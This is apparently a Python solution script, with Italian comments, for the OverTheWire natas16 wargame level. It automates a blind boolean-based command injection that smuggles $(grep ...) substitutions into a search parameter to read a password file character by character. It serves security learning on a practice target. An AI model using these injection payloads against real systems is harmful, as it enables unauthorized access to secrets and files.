#!/usr/bin/env python3
"""
natas16 (OverTheWire) - Blind OS command injection (boolean-based).

Estrae la password di 'natas17' (file `/etc/natas_webpass/natas17`) sfruttando
la pagina vulnerabile di natas16, che esegue:

    grep -i "$key" dictionary.txt

Il parametro `needle` ($key) viene concatenato dentro i doppi apici del comando.
Una blacklist blocca  ; | & ` ' "  ma NON blocca  $ ( )  { } . ^  spazio  - / :
percio' e' possibile una command substitution `$(...)`, valutata dalla shell
anche dentro i doppi apici.

Oracolo booleano
----------------
La pagina non stampa l'output di un comando arbitrario: mostra solo le righe di
dictionary.txt che fanno match. Si costruisce allora un oracolo, dato un
carattere candidato `c` alla posizione `i` (1-based):

    payload:  $(grep -vE ^.{i-1}c /etc/natas_webpass/natas17)MARKER
    comando:  grep -i "$(grep -vE ^.{i-1}c /etc/natas_webpass/natas17)MARKER" dictionary.txt

Il file bersaglio contiene una sola riga (la password):
  - il grep interno e' case-sensitive (niente -i): `^.{i-1}c` verifica che il
    carattere in posizione i sia ESATTAMENTE c (maiuscolo/minuscolo distinti);
  - se COMBACIA -> `grep -v` esclude l'unica riga -> output interno vuoto ->
    il pattern esterno diventa "MARKER" -> vengono stampate le parole che
    contengono MARKER -> <pre> non vuoto  => TRUE;
  - se NON combacia -> `grep -v` stampa la password -> il pattern esterno e'
    "<password>MARKER", che nessuna parola contiene -> <pre> vuoto => FALSE.

MARKER e' una parola sicuramente presente nel dizionario (ricavata a runtime).
Senza MARKER, sul TRUE il pattern esterno sarebbe "" e `grep -i ""` stamperebbe
l'INTERO dizionario (~460 KB per richiesta): il marker limita l'output alle sole
parole che lo contengono, riducendo drasticamente la banda a parita' di oracolo.

Si scandisce ogni posizione provando tutti i caratteri [0-9A-Za-z] (scansione
lineare) e si registra quello che restituisce TRUE, fino alla lunghezza della
password (32 per Natas).

Ricerca binaria (--binary)
--------------------------
Ottimizzazione opzionale. Invece del test di uguaglianza `^.{i-1}c` si usa un
test di APPARTENENZA a un insieme tramite una bracket expression della regex:

    $(grep -vE ^.{i-1}[SOTTOINSIEME] /etc/natas_webpass/natas17)MARKER

che e' TRUE se il carattere in posizione i e' uno qualsiasi di SOTTOINSIEME. Si
dimezza ripetutamente il charset (log2(62) ~ 6 test per posizione) passando da
~1040 a ~200 richieste. La classe [...] e' sicura perche' il charset e'
alfanumerico (nessun carattere speciale come ] ^ - dentro le parentesi), e con
le opzioni di default della shell un glob [...] che non combacia con alcun file
viene passato letteralmente a grep (verificato sul server).

Dipendenze:
    pip install requests

Uso:
    python natas16_blind_command_injection.py --password <password_natas16>
    python natas16_blind_command_injection.py --password <password_natas16> --binary
    python natas16_blind_command_injection.py --password <password_natas16> --verbose

La password del livello e' obbligatoria e va passata a runtime: nessuna
credenziale e' hardcoded nel sorgente (vincolo del repo dei writeup).
"""

import argparse
import os
import re
import string
import sys
import time

import requests
from requests.auth import HTTPBasicAuth

# --- Configurazione di default (sovrascrivibile da riga di comando) ---
BASE_URL = "http://natas16.natas.labs.overthewire.org/"
LEVEL_USER = "natas16"
TARGET_FILE = "/etc/natas_webpass/natas17"  # file con la password da estrarre

# Caratteri delle password Natas: cifre + maiuscole + minuscole (alfanumerico).
CHARSET = string.digits + string.ascii_uppercase + string.ascii_lowercase

PASSWORD_LEN = 32  # lunghezza predefinita delle password di Natas
TIMEOUT = 20       # secondi per richiesta

# Estrae il contenuto del blocco <pre>...</pre> dove passthru inietta l'output.
PRE_RE = re.compile(r"<pre>(.*?)</pre>", re.DOTALL)
# Parola "pulita" da usare come marker: solo lettere (niente apostrofi, che la
# blacklist bloccherebbe), lunghezza >= 3 per evitare match troppo generici.
WORD_RE = re.compile(r"[A-Za-z]{3,}")


def enable_ansi():
    """Abilita le sequenze ANSI/VT sul terminale Windows (best-effort)."""
    if sys.platform == "win32":
        try:
            import ctypes
            kernel32 = ctypes.windll.kernel32
            # ENABLE_PROCESSED_OUTPUT|WRAP_AT_EOL|VIRTUAL_TERMINAL_PROCESSING = 7
            kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
        except Exception:
            pass


class Oracle:
    """Incapsula la richiesta HTTP, il parsing dell'output e il conteggio."""

    def __init__(self, session, url, target_file):
        self.session = session
        self.url = url
        self.target_file = target_file
        self.marker = ""   # impostato da prepare()
        self.count = 0

    def _pre(self, needle):
        """Invia `needle` e ritorna il testo dentro <pre>...</pre> (o '')."""
        self.count += 1
        resp = self.session.post(self.url, data={"needle": needle}, timeout=TIMEOUT)
        resp.raise_for_status()
        if "illegal character" in resp.text:
            raise RuntimeError(f"Input rifiutato dalla blacklist: {needle!r}")
        m = PRE_RE.search(resp.text)
        return m.group(1) if m else ""

    def char_matches(self, pos, c):
        """True se il carattere in posizione `pos` (1-based) e' esattamente `c`.

        Usato dalla scansione lineare. Oracolo: <pre> non vuoto => TRUE.
        """
        needle = f"$(grep -vE ^.{{{pos - 1}}}{c} {self.target_file}){self.marker}"
        return bool(self._pre(needle).strip())

    def chars_in_set(self, pos, subset):
        """True se il carattere in posizione `pos` (1-based) appartiene a `subset`.

        Usato dalla ricerca binaria: `[subset]` e' una bracket expression della
        regex, quindi combacia se il carattere e' uno qualsiasi di quelli in
        `subset` (case-sensitive). Oracolo: <pre> non vuoto => TRUE.
        """
        needle = f"$(grep -vE ^.{{{pos - 1}}}[{subset}] {self.target_file}){self.marker}"
        return bool(self._pre(needle).strip())


def prepare(oracle):
    """Ricava il marker e valida l'oracolo senza usare la password segreta.

    - `$(echo)` -> substitution vuota -> pattern "" -> `grep -i ""` stampa TUTTO
      il dizionario: serve sia come controllo TRUE sia per pescare il marker.
    - controllo FALSE: una stringa alfanumerica non presente nel dizionario deve
      dare <pre> vuoto.
    """
    full_dict = oracle._pre("$(echo)")
    if not full_dict.strip():
        raise RuntimeError(
            "Controllo TRUE fallito: `$(echo)` non produce output. "
            "Verifica URL, credenziali e struttura del blocco <pre>."
        )
    words = WORD_RE.findall(full_dict)
    if not words:
        raise RuntimeError("Impossibile ricavare un marker dal dizionario.")
    oracle.marker = words[0]

    if oracle._pre("qzxjkvwnoword0000").strip():
        raise RuntimeError(
            "Controllo FALSE fallito: una stringa inesistente produce output. "
            "Il rilevamento del blocco <pre> potrebbe essere errato."
        )
    return oracle.marker


def _bar(done, total, width=28):
    """Barra di avanzamento testuale: [####----]  42.0%."""
    filled = int(width * done / total) if total else 0
    pct = (done / total * 100) if total else 0.0
    return f"[{'#' * filled}{'-' * (width - filled)}] {pct:5.1f}%"


class LiveProgress:
    """Barra di avanzamento + campo password che si aggiornano sul posto.

    Occupa due righe fisse del terminale: la prima con la barra, la seconda con
    la password parziale. A ogni update si risale di due righe e si riscrive.
    """

    def __init__(self, total, label):
        self.total = total
        self.label = label
        self.started = False

    def update(self, done, value):
        if self.started:
            sys.stdout.write("\033[2F")          # su di 2 righe, inizio blocco
        self.started = True
        sys.stdout.write("\033[2K" + _bar(done, self.total) + "\n")
        sys.stdout.write("\033[2K" + self.label + value + "\n")
        sys.stdout.flush()


def find_char_linear(oracle, pos, charset):
    """Scansione lineare: prova ogni candidato finche' uno da' TRUE.

    Fino a len(charset) richieste per posizione. Restituisce None se nessuno
    combacia (fine password, charset incompleto o comportamento anomalo).
    """
    for c in charset:
        if oracle.char_matches(pos, c):
            return c
    return None


def find_char_binary(oracle, pos, charset):
    """Ricerca binaria sul charset: ~log2(len(charset)) richieste per posizione.

    Prima verifica che il carattere sia nel charset (serve anche a rilevare la
    fine della password), poi dimezza l'insieme dei candidati. Restituisce None
    se nessun candidato combacia.
    """
    if not oracle.chars_in_set(pos, charset):
        return None
    candidates = charset
    while len(candidates) > 1:
        mid = len(candidates) // 2
        lower = candidates[:mid]
        if oracle.chars_in_set(pos, lower):
            candidates = lower
        else:
            candidates = candidates[mid:]
    return candidates[0]


def extract_password(oracle, length, charset, binary=False, verbose=False):
    """Ricostruisce la password carattere per carattere.

    `binary=False` -> scansione lineare (metodo documentato nel writeup);
    `binary=True`  -> ricerca binaria sul charset (ottimizzazione).
    """
    find_char = find_char_binary if binary else find_char_linear
    label = f"Password di {os.path.basename(oracle.target_file)}: "
    progress = None if verbose else LiveProgress(length, label)
    if progress:
        progress.update(0, "")

    chars = []
    for pos in range(1, length + 1):
        found = find_char(oracle, pos, charset)
        if found is None:
            if progress:
                sys.stdout.write("\n")
            print(
                f"[!] Nessun carattere del charset combacia in posizione {pos}: "
                "possibile fine password, charset incompleto o comportamento anomalo.",
                file=sys.stderr,
            )
            break
        chars.append(found)
        current = "".join(chars)
        if verbose:
            print(f"  [pos {pos:2d}/{length}] {found!r}  ->  {current}")
        else:
            progress.update(pos, current)
    return "".join(chars)


def build_session(user, password):
    session = requests.Session()
    session.auth = HTTPBasicAuth(user, password)
    return session


def parse_args():
    p = argparse.ArgumentParser(
        description="Estrattore blind OS command injection per natas16 -> password di natas17."
    )
    p.add_argument("--url", default=BASE_URL, help="URL della pagina vulnerabile")
    p.add_argument("--user", default=LEVEL_USER, help="username HTTP Basic Auth")
    p.add_argument("--password", required=True,
                   help="password HTTP Basic Auth del livello (obbligatoria)")
    p.add_argument("--target-file", default=TARGET_FILE,
                   help="file sul server da cui estrarre la password")
    p.add_argument("--length", type=int, default=PASSWORD_LEN,
                   help="lunghezza attesa della password")
    p.add_argument("--charset", default=CHARSET,
                   help="insieme di caratteri candidati (alfanumerico)")
    p.add_argument("--binary", action="store_true",
                   help="ricerca binaria sul charset (~200 richieste invece di ~1040)")
    p.add_argument("--verbose", action="store_true",
                   help="stampa il dettaglio di ogni carattere invece della barra")
    return p.parse_args()


def main():
    args = parse_args()
    enable_ansi()
    session = build_session(args.user, args.password)
    oracle = Oracle(session, args.url, args.target_file)

    start = time.time()
    try:
        print(f"[*] Target: {args.url}  (file: {args.target_file})")
        print("[*] Validazione dell'oracolo e scelta del marker...")
        marker = prepare(oracle)
        print(f"[+] Oracolo OK. Marker: {marker!r}")
        print(f"[*] Estrazione in corso (ricerca {'binaria' if args.binary else 'lineare'})...")
        password = extract_password(oracle, args.length, args.charset,
                                    binary=args.binary, verbose=args.verbose)
    except requests.RequestException as exc:
        print(f"\n[!] Errore di rete: {exc}", file=sys.stderr)
        return 1
    except RuntimeError as exc:
        print(f"\n[!] {exc}", file=sys.stderr)
        return 1
    except KeyboardInterrupt:
        print("\n[!] Interrotto dall'utente.", file=sys.stderr)
        return 130

    elapsed = time.time() - start
    print(f"[i] Richieste HTTP inviate: {oracle.count}  |  Tempo: {elapsed:.1f}s")
    return 0


if __name__ == "__main__":
    sys.exit(main())
